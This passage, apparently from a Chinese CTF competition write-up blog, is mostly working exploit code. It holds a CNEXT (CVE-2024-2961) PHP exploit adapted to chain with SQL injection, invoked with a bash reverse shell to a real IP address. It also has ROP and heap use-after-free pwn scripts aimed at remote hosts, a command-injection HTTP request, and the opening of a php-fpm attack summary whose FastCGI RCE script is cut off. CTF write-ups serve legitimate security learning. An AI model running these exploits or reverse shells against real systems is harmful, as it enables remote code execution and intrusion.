CURLOPT_URL, $url);\n    curl_setopt($curl, CURLOPT_HEADER, 0);\n    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\n    $tmpInfo = curl_exec($curl);\n    curl_close($curl);\n    return $tmpInfo;\n}\n\nfunction get_filename($len){\n    $chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\";\n    $var_size = strlen($chars);\n    $res = '';\n    for( $x = 0; $x < $len; $x++ ) {\n        $random_str= $chars[ rand( 0, $var_size - 1 ) ];\n        $res .= $random_str;\n    }\n    $res = date(\"Y-m-d\"). '_' . $res . '.txt';\n    return $res;\n}\n\nfunction check($conn , $filename, $url){\n    $sql = \"SELECT filename from data where url = '$url'\";\n    $result = $conn->query($sql);\n    if ($result) {\n        $row = mysqli_fetch_all($result);\n        foreach ( $row as $value){\n            if( hash_file('md5', $filename) === hash_file('md5', $value[0])){\n                return false;\n            }\n        }\n    }\n    return true;\n}\n```\n\n公告提示说注意hash_file函数，那就很明显可以配合sql注入打hash_file的 CNEXT (CVE-2024-2961)\n\n\n\n\n调整后的exp\n\n1：在Remote类中修改读取文件的逻辑，本题中用file://localhost读取/proc/self/maps和libc\n2：修改exploit的path，搭配sql注入发送payload给hash_file\n3：注释掉`self.check_vulnerable()`的判断\n\n````python\n#!/usr/bin/env python3\n#\n# CNEXT: PHP file-read to RCE (CVE-2024-2961)\n# Date: 2024-05-27\n# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)\n#\n# TODO Parse LIBC to know if patched\n#\n# INFORMATIONS\n#\n# To use, implement the Remote class, which tells the exploit how to send the payload.\n#\n# REQUIREMENTS\n#\n# Requires ten: https://github.com/cfreal/ten\n#\n\nfrom __future__ import annotations\n\nimport base64\nimport zlib\n\nfrom dataclasses import dataclass\nfrom requests.exceptions import ConnectionError, ChunkedEncodingError\n\nfrom pwn import *\nfrom ten import *\n\n\nHEAP_SIZE = 2 * 1024 * 1024\nBUG = \"劄\".encode(\"utf-8\")\n\n\nclass Remote:\n    \"\"\"A helper class to send the payload and download files.\n    \n    The logic of the exploit is always the same, but the exploit needs to know how to\n    download files (/proc/self/maps and libc) and how to send the payload.\n    \n    The code here serves as an example that attacks a page that looks like:\n    \n    ```php\n    <?php\n    \n    $data = file_get_contents($_POST['file']);\n    echo \"File contents: $data\";\n    ```\n    \n    Tweak it to fit your target, and start the exploit.\n    \"\"\"\n\n    def __init__(self, url: str) -> None:\n        self.url = url\n        self.session = Session()\n\n    def send(self, path: str) -> Response:\n        \"\"\"Sends given `path` to the HTTP server. Returns the response.\n        \"\"\"\n        return self.session.post(self.url, data={\"url\": path})\n        \n    def download(self, path: str) -> bytes:\n        \"\"\"Returns the contents of a remote file.\n        \"\"\"\n        # path = f\"php://filter/convert.base64-encode/resource={path}\"\n        path = f\"file://localhost/{path}\"\n        response = self.send(path)\n        # data = response.re.search(b\"File contents: (.*)\", flags=re.S).group(1)\n        # return base64.decode(data)\n        return response.content\n\n@entry\n@arg(\"url\", \"Target URL\")\n@arg(\"command\", \"Command to run on the system; limited to 0x140 bytes\")\n@arg(\"sleep_time\", \"Time to sleep to assert that the exploit worked. By default, 1.\")\n@arg(\"heap\", \"Address of the main zend_mm_heap structure.\")\n@arg(\n    \"pad\",\n    \"Number of 0x100 chunks to pad with. If the website makes a lot of heap \"\n    \"operations with this size, increase this. Defaults to 20.\",\n)\n@dataclass\nclass Exploit:\n    \"\"\"CNEXT exploit: RCE using a file read primitive in PHP.\"\"\"\n\n    url: str\n    command: str\n    sleep: int = 1\n    heap: str = None\n    pad: int = 20\n\n    def __post_init__(self):\n        self.remote = Remote(self.url)\n        self.log = logger(\"EXPLOIT\")\n        self.info = {}\n        self.heap = self.heap and int(self.heap, 16)\n\n    def check_vulnerable(self) -> None:\n        \"\"\"Checks whether the target is reachable and properly allows for the various\n        wrappers and filters that the exploit needs.\n        \"\"\"\n        \n        def safe_download(path: str) -> bytes:\n            try:\n                return self.remote.download(path)\n            except ConnectionError:\n                failure(\"Target not [b]reachable[/] ?\")\n            \n\n        def check_token(text: str, path: str) -> bool:\n            result = safe_download(path)\n            return text.encode() == result\n\n        text = tf.random.string(50).encode()\n        base64 = b64(text, misalign=True).decode()\n        path = f\"data:text/plain;base64,{base64}\"\n        \n        result = safe_download(path)\n        \n        if text not in result:\n            msg_failure(\"Remote.download did not return the test string\")\n            print(\"--------------------\")\n            print(f\"Expected test string: {text}\")\n            print(f\"Got: {result}\")\n            print(\"--------------------\")\n            failure(\"If your code works fine, it means that the [i]data://[/] wrapper does not work\")\n\n        msg_info(\"The [i]data://[/] wrapper works\")\n\n        text = tf.random.string(50)\n        base64 = b64(text.encode(), misalign=True).decode()\n        path = f\"php://filter//resource=data:text/plain;base64,{base64}\"\n        if not check_token(text, path):\n            failure(\"The [i]php://filter/[/] wrapper does not work\")\n\n        msg_info(\"The [i]php://filter/[/] wrapper works\")\n\n        text = tf.random.string(50)\n        base64 = b64(compress(text.encode()), misalign=True).decode()\n        path = f\"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}\"\n\n        if not check_token(text, path):\n            failure(\"The [i]zlib[/] extension is not enabled\")\n\n        msg_info(\"The [i]zlib[/] extension is enabled\")\n\n        msg_success(\"Exploit preconditions are satisfied\")\n\n    def get_file(self, path: str) -> bytes:\n        with msg_status(f\"Downloading [i]{path}[/]...\"):\n            return self.remote.download(path)\n\n    def get_regions(self) -> list[Region]:\n        \"\"\"Obtains the memory regions of the PHP process by querying /proc/self/maps.\"\"\"\n        maps = self.get_file(\"/proc/self/maps\")\n        maps = maps.decode()\n        PATTERN = re.compile(\n            r\"^([a-f0-9]+)-([a-f0-9]+)\\b\" r\".*\" r\"\\s([-rwx]{3}[ps])\\s\" r\"(.*)\"\n        )\n        regions = []\n        for region in table.split(maps, strip=True):\n            if match := PATTERN.match(region):\n                start = int(match.group(1), 16)\n                stop = int(match.group(2), 16)\n                permissions = match.group(3)\n                path = match.group(4)\n                if \"/\" in path or \"[\" in path:\n                    path = path.rsplit(\" \", 1)[-1]\n                else:\n                    path = \"\"\n                current = Region(start, stop, permissions, path)\n                regions.append(current)\n            else:\n                print(maps)\n                failure(\"Unable to parse memory mappings\")\n\n        self.log.info(f\"Got {len(regions)} memory regions\")\n\n        return regions\n\n    def get_symbols_and_addresses(self) -> None:\n        \"\"\"Obtains useful symbols and addresses from the file read primitive.\"\"\"\n        regions = self.get_regions()\n\n        LIBC_FILE = \"/dev/shm/cnext-libc\"\n\n        # PHP's heap\n\n        self.info[\"heap\"] = self.heap or self.find_main_heap(regions)\n\n        # Libc\n\n        libc = self._get_region(regions, \"libc-\", \"libc.so\")\n\n        self.download_file(libc.path, LIBC_FILE)\n\n        self.info[\"libc\"] = ELF(LIBC_FILE, checksec=False)\n        self.info[\"libc\"].address = libc.start\n\n    def _get_region(self, regions: list[Region], *names: str) -> Region:\n        \"\"\"Returns the first region whose name matches one of the given names.\"\"\"\n        for region in regions:\n            if any(name in region.path for name in names):\n                break\n        else:\n            failure(\"Unable to locate region\")\n\n        return region\n\n    def download_file(self, remote_path: str, local_path: str) -> None:\n        \"\"\"Downloads `remote_path` to `local_path`\"\"\"\n        data = self.get_file(remote_path)\n        Path(local_path).write(data)\n\n    def find_main_heap(self, regions: list[Region]) -> Region:\n        # Any anonymous RW region with a size superior to the base heap size is a\n        # candidate. The heap is at the bottom of the region.\n        heaps = [\n            region.stop - HEAP_SIZE + 0x40\n            for region in reversed(regions)\n            if region.permissions == \"rw-p\"\n            and region.size >= HEAP_SIZE\n            and region.stop & (HEAP_SIZE-1) == 0\n            and region.path == \"\"\n        ]\n\n        if not heaps:\n            failure(\"Unable to find PHP's main heap in memory\")\n\n        first = heaps[0]\n\n        if len(heaps) > 1:\n            heaps = \", \".join(map(hex, heaps))\n            msg_info(f\"Potential heaps: [i]{heaps}[/] (using first)\")\n        else:\n            msg_info(f\"Using [i]{hex(first)}[/] as heap\")\n\n        return first\n\n    def run(self) -> None:\n        # self.check_vulnerable()\n        self.get_symbols_and_addresses()\n        self.exploit()\n\n    def build_exploit_path(self) -> str:\n        \"\"\"On each step of the exploit, a filter will process each chunk one after the\n        other. Processing generally involves making some kind of operation either\n        on the chunk or in a destination chunk of the same size. Each operation is\n        applied on every single chunk; you cannot make PHP apply iconv on the first 10\n        chunks and leave the rest in place. That's where the difficulties come from.\n\n        Keep in mind that we know the address of the main heap, and the libraries.\n        ASLR/PIE do not matter here.\n\n        The idea is to use the bug to make the freelist for chunks of size 0x100 point\n        lower. For instance, we have the following free list:\n\n        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00\n\n        By triggering the bug from chunk ..900, we get:\n\n        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???\n\n        That's step 3.\n\n        Now, in order to control the free list, and make it point whereever we want,\n        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,\n        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.\n        That's step 2.\n\n        Now, if we were to perform step2 an then step3 without anything else, we'd have\n        a problem: after step2 has been processed, the free list goes bottom-up, like:\n\n        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900\n\n        We need to go the other way around. That's why we have step 1: it just allocates\n        chunks. When they get freed, they reverse the free list. Now step2 allocates in\n        reverse order, and therefore after step2, chunks are in the correct order.\n\n        Another problem comes up.\n\n        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.\n        Since step2 creates chunks that contain pointers and pointers are generally not\n        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.\n        To avoid this, we put the chunks in step2 at the very end of the chain, and\n        prefix them with `0\\n`. When dechunked (right before the iconv), they will\n        \"disappear\" from the chain, preserving them from the character set conversion\n        and saving us from an unwanted processing error that would stop the processing\n        chain.\n\n        After step3 we have a corrupted freelist with an arbitrary pointer into it. We\n        don't know the precise layout of the heap, but we know that at the top of the\n        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.\n        Its free_slot[] array contains a pointer to each free list. By overwriting it,\n        we can make PHP allocate chunks whereever we want. In addition, its custom_heap\n        field contains pointers to hook functions for emalloc, efree, and erealloc\n        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and\n        then overwrite the use_custom_heap flag to make PHP use these function pointers\n        instead. We can now do our favorite CTF technique and get a call to\n        system(<chunk>).\n        We make sure that the \"system\" command kills the current process to avoid other\n        system() calls with random chunk data, leading to undefined behaviour.\n\n        The pad blocks just \"pad\" our allocations so that even if the heap of the\n        process is in a random state, we still get contiguous, in order chunks for our\n        exploit.\n\n        Therefore, the whole process described here CANNOT crash. Everything falls\n        perfectly in place, and nothing can get in the middle of our allocations.\n        \"\"\"\n\n        LIBC = self.info[\"libc\"]\n        ADDR_EMALLOC = LIBC.symbols[\"__libc_malloc\"]\n        ADDR_EFREE = LIBC.symbols[\"__libc_system\"]\n        ADDR_EREALLOC = LIBC.symbols[\"__libc_realloc\"]\n\n        ADDR_HEAP = self.info[\"heap\"]\n        ADDR_FREE_SLOT = ADDR_HEAP + 0x20\n        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168\n\n        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10\n\n        CS = 0x100\n\n        # Pad needs to stay at size 0x100 at every step\n        pad_size = CS - 0x18\n        pad = b\"\\x00\" * pad_size\n        pad = chunked_chunk(pad, len(pad) + 6)\n        pad = chunked_chunk(pad, len(pad) + 6)\n        pad = chunked_chunk(pad, len(pad) + 6)\n        pad = compressed_bucket(pad)\n\n        step1_size = 1\n        step1 = b\"\\x00\" * step1_size\n        step1 = chunked_chunk(step1)\n        step1 = chunked_chunk(step1)\n        step1 = chunked_chunk(step1, CS)\n        step1 = compressed_bucket(step1)\n\n        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to\n        # ISO-2022-CN-EXT. We add a `0\\n` that makes the 4th and last dechunk \"crash\"\n\n        step2_size = 0x48\n        step2 = b\"\\x00\" * (step2_size + 8)\n        step2 = chunked_chunk(step2, CS)\n        step2 = chunked_chunk(step2)\n        step2 = compressed_bucket(step2)\n\n        step2_write_ptr = b\"0\\n\".ljust(step2_size, b\"\\x00\") + p64(ADDR_FAKE_BIN)\n        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)\n        step2_write_ptr = chunked_chunk(step2_write_ptr)\n        step2_write_ptr = compressed_bucket(step2_write_ptr)\n\n        step3_size = CS\n\n        step3 = b\"\\x00\" * step3_size\n        assert len(step3) == CS\n        step3 = chunked_chunk(step3)\n        step3 = chunked_chunk(step3)\n        step3 = chunked_chunk(step3)\n        step3 = compressed_bucket(step3)\n\n        step3_overflow = b\"\\x00\" * (step3_size - len(BUG)) + BUG\n        assert len(step3_overflow) == CS\n        step3_overflow = chunked_chunk(step3_overflow)\n        step3_overflow = chunked_chunk(step3_overflow)\n        step3_overflow = chunked_chunk(step3_overflow)\n        step3_overflow = compressed_bucket(step3_overflow)\n\n        step4_size = CS\n        step4 = b\"=00\" + b\"\\x00\" * (step4_size - 1)\n        step4 = chunked_chunk(step4)\n        step4 = chunked_chunk(step4)\n        step4 = chunked_chunk(step4)\n        step4 = compressed_bucket(step4)\n\n        # This chunk will eventually overwrite mm_heap->free_slot\n        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values\n        step4_pwn = ptr_bucket(\n            0x200000,\n            0,\n            # free_slot\n            0,\n            0,\n            ADDR_CUSTOM_HEAP,  # 0x18\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            ADDR_HEAP,  # 0x140\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            0,\n            size=CS,\n        )\n\n        step4_custom_heap = ptr_bucket(\n            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18\n        )\n\n        step4_use_custom_heap_size = 0x140\n\n        COMMAND = self.command\n        COMMAND = f\"kill -9 $PPID; {COMMAND}\"\n        if self.sleep:\n            COMMAND = f\"sleep {self.sleep}; {COMMAND}\"\n        COMMAND = COMMAND.encode() + b\"\\x00\"\n\n        assert (\n            len(COMMAND) <= step4_use_custom_heap_size\n        ), f\"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}\"\n        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b\"\\x00\")\n\n        step4_use_custom_heap = COMMAND\n        step4_use_custom_heap = qpe(step4_use_custom_heap)\n        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)\n        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)\n\n        pages = (\n            step4 * 3\n            + step4_pwn\n            + step4_custom_heap\n            + step4_use_custom_heap\n            + step3_overflow\n            + pad * self.pad\n            + step1 * 3\n            + step2_write_ptr\n            + step2 * 2\n        )\n\n        resource = compress(compress(pages))\n        resource = b64(resource)\n        resource = f\"data:text/plain;base64,{resource.decode()}\"\n\n        filters = [\n            # Create buckets\n            \"zlib.inflate\",\n            \"zlib.inflate\",\n            \n            # Step 0: Setup heap\n            \"dechunk\",\n            \"convert.iconv.latin1.latin1\",\n            \n            # Step 1: Reverse FL order\n            \"dechunk\",\n            \"convert.iconv.latin1.latin1\",\n            \n            # Step 2: Put fake pointer and make FL order back to normal\n            \"dechunk\",\n            \"convert.iconv.latin1.latin1\",\n            \n            # Step 3: Trigger overflow\n            \"dechunk\",\n            \"convert.iconv.UTF-8.ISO-2022-CN-EXT\",\n            \n            # Step 4: Allocate at arbitrary address and change zend_mm_heap\n            \"convert.quoted-printable-decode\",\n            \"convert.iconv.latin1.latin1\",\n        ]\n        filters = \"|\".join(filters)\n        path = f\"php://filter/read={filters}/resource={resource}\"\n\n        return path\n\n    @inform(\"Triggering...\")\n    def exploit(self) -> None:\n        path = self.build_exploit_path()\n        start = time.time()\n        path = f\"http://localhsot/' union select '{path}'#\"\n        try:\n            self.remote.send(path)\n        except (ConnectionError, ChunkedEncodingError):\n            pass\n        \n        msg_print()\n        \n        if not self.sleep:\n            msg_print(\"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]\")\n        elif start + self.sleep <= time.time():\n            msg_print(\"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]\")\n        else:\n            # Wrong heap, maybe? If the exploited suggested others, use them!\n            msg_print(\"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]\")\n        \n        msg_print()\n\n\ndef compress(data) -> bytes:\n    \"\"\"Returns data suitable for `zlib.inflate`.\n    \"\"\"\n    # Remove 2-byte header and 4-byte checksum\n    return zlib.compress(data, 9)[2:-4]\n\n\ndef b64(data: bytes, misalign=True) -> bytes:\n    payload = base64.encode(data)\n    if not misalign and payload.endswith(\"=\"):\n        raise ValueError(f\"Misaligned: {data}\")\n    return payload.encode()\n\n\ndef compressed_bucket(data: bytes) -> bytes:\n    \"\"\"Returns a chunk of size 0x8000 that, when dechunked, returns the data.\"\"\"\n    return chunked_chunk(data, 0x8000)\n\n\ndef qpe(data: bytes) -> bytes:\n    \"\"\"Emulates quoted-printable-encode.\n    \"\"\"\n    return \"\".join(f\"={x:02x}\" for x in data).upper().encode()\n\n\ndef ptr_bucket(*ptrs, size=None) -> bytes:\n    \"\"\"Creates a 0x8000 chunk that reveals pointers after every step has been ran.\"\"\"\n    if size is not None:\n        assert len(ptrs) * 8 == size\n    bucket = b\"\".join(map(p64, ptrs))\n    bucket = qpe(bucket)\n    bucket = chunked_chunk(bucket)\n    bucket = chunked_chunk(bucket)\n    bucket = chunked_chunk(bucket)\n    bucket = compressed_bucket(bucket)\n\n    return bucket\n\n\ndef chunked_chunk(data: bytes, size: int = None) -> bytes:\n    \"\"\"Constructs a chunked representation of the given chunk. If size is given, the\n    chunked representation has size `size`.\n    For instance, `ABCD` with size 10 becomes: `0004\\nABCD\\n`.\n    \"\"\"\n    # The caller does not care about the size: let's just add 8, which is more than\n    # enough\n    if size is None:\n        size = len(data) + 8\n    keep = len(data) + len(b\"\\n\\n\")\n    size = f\"{len(data):x}\".rjust(size - keep, \"0\")\n    return size.encode() + b\"\\n\" + data + b\"\\n\"\n\n\n@dataclass\nclass Region:\n    \"\"\"A memory region.\"\"\"\n\n    start: int\n    stop: int\n    permissions: str\n    path: str\n\n    @property\n    def size(self) -> int:\n        return self.stop - self.start\n\n\nExploit()\n\n````\n\n用法与原来一样\n\n`python3 exp.py http://x.x.x.x:10034/url.php 'bash -c \"bash -i>&/dev/tcp/47.99.77.52/8888 0>&1\"'`\n\n\n![](/img/wp/2024/2024-ycb-c-网络照相馆-1.png)\n\n\n\n\n# [初赛] pwn\n\n## pstack\n\n栈溢出\n\n```python\nfrom pwn import *\npop_rdi=0x0000000000400773\nleave=0x4006DB\nret=0x4006DC\nread=0x4006C4\n#p=process(\"./pwn\")\n#gdb.attach(p,f'bp {leave}')\np=remote(\"139.155.126.78\",\"39592\")\ne=ELF(\"./pwn\")\nlibc=ELF(\"./libc.so.6\")\n#libc=ELF(\"./libc\")\nfun_got=e.got['puts']\nputs=e.plt['puts']\nbss=e.bss(0x800)\n\npayload=b'a'*0x30+p64(bss)+p64(read)\np.sendafter(\"rflow?\\n\",payload)\np.send(p64(bss+0x50)+p64(pop_rdi)+p64(fun_got)+p64(puts)+p64(read)+p64(0)+p64(bss-0x30)+p64(leave))\nd=u64(p.readuntil(b'\\n',drop=1).ljust(8,b'\\x00'))\nlibc.address=d-libc.sym['puts']\nsystem=libc.sym['system']\nbin_sh=next(libc.search(b'/bin/sh\\x00'))\n\npayload=p64(bss)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(read)+p64(bss+0x50-0x30)+p64(leave)\np.send(payload)\np.interactive()\n```\n\n\n## TravelGraph\n\nuaf\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\ncity=[b\"guangzhou\",b\"nanning\",b\"changsha\",b\"nanchang\",b\"fuzhou\"]\ndef add(tool,form,to,data=b'\\n',far=999):\n    tools=[b'car',b'train',b'plane']\n\n    p.sendlineafter(b'distance.',b'1')\n    p.sendlineafter(b'plane?',tools[tool])\n    p.sendlineafter(b'where?',city[form])\n    p.sendlineafter(b'where?',city[to])\n    p.sendlineafter(b'far?',str(far).encode());\n    p.sendafter(b'Note:',data)\n    pass\n\ndef free(form,to):\n    p.sendlineafter(b'distance.',b'2')\n    p.sendlineafter(b'where?',city[form])\n    p.sendlineafter(b'where?',city[to])\n\ndef show(form,to):\n    p.sendlineafter(b'distance.',b'3')\n    p.sendlineafter(b'where?',city[form])\n    p.sendlineafter(b'where?',city[to])\n\ndef edit(form,to,ind,data,far=3000):\n    p.sendlineafter(b'distance.',b'4')\n    p.sendlineafter(b'where?',city[form])\n    p.sendlineafter(b'where?',city[to])\n    p.sendlineafter(b'change?',str(ind).encode())\n    p.sendlineafter(b'far?',str(far).encode());\n    p.sendafter(b'Note:',data)\n\ndef distan():\n    p.sendlineafter(b'distance.',b'5')\n    p.sendlineafter(b'travel',city[3])\n#p=process('./pwn')\np=remote(\"139.155.126.78\",\"39558\")\nlibc=ELF(\"./libc.so.6\")\n#gdb.attach(p,'b _IO_obstack_xsputn\\nc')\n#context.log_level='debug'\n\nadd(0,0,1,far=999,data=b\"1324\") # 0\nadd(0,1,2,far=999,data=b\"321\") #1\nadd(0,2,3,far=999,data=b\"132\") #2\ndistan()\nadd(0,3,3)  #3\nadd(0,3,3) #4\nadd(2,3,3) #5\nadd(2,4,4,b\"adsf\") #6\n#pause()\nfree(3,3)\n#pause()\n#free(0,0)\nadd(1,4,2) #3\nadd(1,4,3) #4+0x10\nadd(0,4,1) #5+0x20\nfree(4,3)\nshow(0,0)\np.readuntil('Note:')\nd=u64(p.readuntil(b'\\n',drop=1).ljust(8,b'\\x00'))\nlibc.address=d-0x21ace0\nsuccess(f\"libc.address: 0x{libc.address:x}\")\nIO_list_all=libc.sym['_IO_list_all']\nxxx=libc.address+0x21b660\nsuccess(f\"IO_list_all: 0x{IO_list_all:x}\")\nadd(1,4,3)\nfree(1,2)\nfree(4,3)\nshow(0,0)\np.readuntil('Note:')\nchunk_1=u64(p.readuntil(b'\\n',drop=1).ljust(8,b'\\x00'))\nsuccess(f\"chunk_1: 0x{chunk_1:x}\")\nadd(0,1,2)\nadd(2,1,3)\nshow(0,0)\np.readuntil('Note:')\nlarge_bin=u64(p.readuntil(b'\\n',drop=1).ljust(8,b'\\x00'))\nsuccess(f\"large bin: 0x{large_bin:x}\")\npause()\nedit(0,0,0,p64(large_bin)*2+p64(IO_list_all-0x20)*2,far=0x531)\npause()\n\nchunk_0=chunk_1-0x520\nsetcontext=libc.sym['setcontext']\nmprotect=libc.sym['mprotect']\nwfile_jump=libc.sym['_IO_wfile_jumps']\nobstack_jump=libc.address+0x2173c0\nshellcode=shellcraft.open(\"flag\")+shellcraft.read(3,chunk_1,0x300)+shellcraft.write(1,chunk_1,0x300)\nfake_io_add=chunk_0\n\nobstack=fake_io_add\ncontext=fake_io_add+0xe8\nshelladd=context+0xe8\n\nfake_io=flat({\n    0x20: [xxx,xxx,xxx],\n    0x60: [0,shelladd,0,0,0,0,0,setcontext,0,context,1],\n\n    0xd8: obstack_jump+0x20,\n    0xe0: fake_io_add+0x60,\n    },filler=b'\\x00')\n\ncont=flat({\n    0x68: obstack&(~0xfff), # rdi\n    0x70: 0x1000, # rsi\n    0x88: 7, # rdx\n    0xa0: fake_io_add+0x68, # rsp\n    0xa8: mprotect, # rcx->rip\n    0xe0: obstack\n    },filler=b'\\x00')\n\npayload=fake_io[0x20:]+cont+asm(shellcode)\n\nfree(0,1)\nadd(0,0,1,data=payload.ljust(0x400,b'\\x00'))\nfree(0,1)\nadd(2,1,3)\n\n#free(4,2)\n#add(1,4,3,data=payload)\n\np.sendline('9')\np.interactive()\n```\n\n\n\n\n## httpd\n\n\n```\n// 第一次 直接执行命令，将flag导入到/check/test.html中\nGET /cat%20/flag%20%3e%63%68%65%63%6b%2f%74%65%73%74%2e%68%74%6d%6c HTTP/1.0\nHost: 139.155.126.78\nContent-Length: 7\n\n123\n\n\n\n\n//第二次\nGET /check/test.html HTTP/1.0\nHost: 139.155.126.78\nContent-Length: 7\n\n123\n\n\n\n\n```\n\n\n\n\n# [决赛] 渗透测试\n\n![拓扑](/img/wp/2024/2024-ycb-j-shentou-1.png)\n","tags":["wp","羊城杯","2024竞赛"],"categories":["wp"]},{"title":"php-fpm攻击总结","url":"/posts/21a69435/","content":"\nPHP-FPM 是 FastCGI 的一个具体实现（协议解析器）\n\nNginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给FPM，然后FPM按照fastcgi的协议将TCP流解析成真正的数据\n\n举个例子，用户访问`http://127.0.0.1/index.php?a=1&b=2`，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：\n\n```\n{\n    'GATEWAY_INTERFACE': 'FastCGI/1.0',\n    'REQUEST_METHOD': 'GET',\n    'SCRIPT_FILENAME': '/var/www/html/index.php',\n    'SCRIPT_NAME': '/index.php',\n    'QUERY_STRING': '?a=1&b=2',\n    'REQUEST_URI': '/index.php?a=1&b=2',\n    'DOCUMENT_ROOT': '/var/www/html',\n    'SERVER_SOFTWARE': 'php/fcgiclient',\n    'REMOTE_ADDR': '127.0.0.1',\n    'REMOTE_PORT': '12345',\n    'SERVER_ADDR': '127.0.0.1',\n    'SERVER_PORT': '80',\n    'SERVER_NAME': \"localhost\",\n    'SERVER_PROTOCOL': 'HTTP/1.1'\n}\n```\n\n其中`SCRIPT_FILENAME`的值就是要执行的文件\n\n\n# Nginx解析漏洞\n\n\n*该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞*\n\n1：由于`nginx.conf`的错误配置导致`nginx`把以`.php`结尾的文件交给`fastcgi`处理，为此可以构造`upload/1.png/1.php`（1.png是上传的文件，包含一句话木马）\n\n2：但是`fastcgi`在处理`1.php`文件时发现文件并不存在，这时`php.ini`配置文件中`cgi.fix_pathinfo=1`发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由`fastcgi`处理的文件就变成了`/1.png`，最后将`1.png`的内容当成php解析\n\n\n漏洞复现地址：[https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability](https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability)\n\n\n# php-fpm未授权导致的任意代码执行\n\nPHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，伪装成Web服务器中间件和 PHP-FPM 通信，这就造成了 PHP-FPM 的未授权访问漏洞\n\n在此基础上，我们可以设置 PHP-FPM 的两个环境变量：`PHP_VALUE`和`PHP_ADMIN_VALUE`。它们的作用就是用来设置PHP配置项的\n\n通过将PHP配置项`auto_prepend_file`或`auto_append_file`的值设置成`php://input`，就能在执行`SCRIPT_FILENAME`指向的文件时进行包含body内容，从而执行我们自定义的恶意代码\n\n设置包含的条件还需要开启`allow_url_include = On`(远程文件包含)\n\n综合起来，如下所示\n\n```\n{\n    'GATEWAY_INTERFACE': 'FastCGI/1.0',\n    'REQUEST_METHOD': 'GET',\n    'SCRIPT_FILENAME': '/var/www/html/index.php',\n    'SCRIPT_NAME': '/index.php',\n    'QUERY_STRING': '?a=1&b=2',\n    'REQUEST_URI': '/index.php?a=1&b=2',\n    'DOCUMENT_ROOT': '/var/www/html',\n    'SERVER_SOFTWARE': 'php/fcgiclient',\n    'REMOTE_ADDR': '127.0.0.1',\n    'REMOTE_PORT': '12345',\n    'SERVER_ADDR': '127.0.0.1',\n    'SERVER_PORT': '80',\n    'SERVER_NAME': \"localhost\",\n    'SERVER_PROTOCOL': 'HTTP/1.1'\n    'PHP_VALUE': 'auto_prepend_file = php://input',\n    'PHP_ADMIN_VALUE': 'allow_url_include = On'\n}\n```\n\n\n\n来自phith0n的攻击脚本：\n\n```python\nimport socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\n\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\n\nPY2 = True if sys.version_info.major == 2 else False\n\n\ndef bchr(i):\n    if PY2:\n        return force_bytes(chr(i))\n    else:\n        return bytes([i])\n\ndef bord(c):\n    if isinstance(c, int):\n        return c\n    else:\n        return ord(c)\n\ndef force_bytes(s):\n    if isinstance(s, bytes):\n        return s\n    else:\n        return s.encode('utf-8', 'strict')\n\ndef force_text(s):\n    if issubclass(type(s), str):\n        return s\n    if isinstance(s, bytes):\n        s = str(s, 'utf-8', 'strict')\n    else:\n        s = str(s)\n    return s\n\n\nclass FastCGIClient:\n    \"\"\"A Fast-CGI Client for Python\"\"\"\n\n    # private\n    __FCGI_VERSION = 1\n\n    __FCGI_ROLE_RESPONDER = 1\n    __FCGI_ROLE_AUTHORIZER = 2\n    __FCGI_ROLE_FILTER = 3\n\n    __FCGI_TYPE_BEGIN = 1\n    __FCGI_TYPE_ABORT = 2\n    __FCGI_TYPE_END = 3\n    __FCGI_TYPE_PARAMS = 4\n    __FCGI_TYPE_STDIN = 5\n    __FCGI_TYPE_STDOUT = 6\n    __FCGI_TYPE_STDERR = 7\n    __FCGI_TYPE_DATA = 8\n    __FCGI_TYPE_GETVALUES = 9\n    __FCGI_TYPE_GETVALUES_RESULT = 10\n    __FCGI_TYPE_UNKOWNTYPE = 11\n\n    __FCGI_HEADER_SIZE = 8\n\n    # request state\n    FCGI_STATE_SEND = 1\n    FCGI_STATE_ERROR = 2\n    FCGI_STATE_SUCCESS = 3\n\n    def __init__(self, host, port, 